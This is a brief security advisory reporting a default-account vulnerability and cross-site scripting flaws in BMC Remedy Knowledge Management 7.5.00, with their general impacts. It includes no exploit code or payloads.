BMC Remedy Knowledge Management is prone to a default-account vulnerability and multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data.

Attackers can leverage the default account issue to bypass authentication and gain access without permission. Successful exploits can aid in further attacks.

An attacker may leverage the cross-site scripting issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.

Remedy Knowledge Management 7.5.00 is vulnerable; other versions may also be affected.
